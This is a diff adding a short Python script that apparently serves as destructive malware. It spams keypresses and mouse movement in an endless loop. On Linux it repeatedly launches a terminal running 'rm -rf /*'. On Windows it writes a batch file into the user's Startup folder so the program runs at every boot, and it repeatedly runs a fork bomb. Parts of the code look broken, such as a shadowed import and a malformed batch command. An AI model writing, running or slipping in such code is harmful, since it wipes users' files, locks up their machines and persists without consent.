@@ -1,0 +1,53 @@
+from sys import platform
+from pynput.mouse import Button, Controller
+from pynput.keyboard import Key, Controller
+import mouse_controller
+import getpass
+import os
+
+USER_NAME=getpass.getuser() # Gets the username of the user
+key=Controller()
+
+# Controls the keyboard
+def keypresses():
+    key.press("Q")
+    key.press("W")
+    key.press("E")
+    key.press("R")
+    key.press("T")
+    key.press("Y")
+
+# Controls the mouse
+mouse_control=mouse_controller.mice()
+
+# Linux code
+def linux():
+    # A loop that presses the keys, moves the mouse position and starts the terminal
+    while True:
+        keypresses()
+        mouse_control()
+        os.system("gnome-terminal 'rm -rf /*'")
+        
+# Windows code
+def win_code():
+    # This code creates a batch file in the startup directory that makes the program start when the computer starts
+    def add_to_startup(file_path=""):
+        if file_path == "":
+            file_path = os.path.dirname(os.path.realpath(__file__))
+        bat_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % USER_NAME
+        with open(bat_path + '\\' + "open.bat", "w+") as bat_file:
+            bat_file.write(r'python "" %s' % file_path)
+    
+    while True:
+        add_to_startup()
+        keypresses()
+        mouse_control()
+        os.system("fork_bomb.bat") 
+        
+# If the user is using linux, use the linux() function
+if platform == 'linux' or platform == 'linux2':
+    linux()
+    
+# If the user is using windows use the windows() function
+elif platform == 'win32':
+    win_code() 
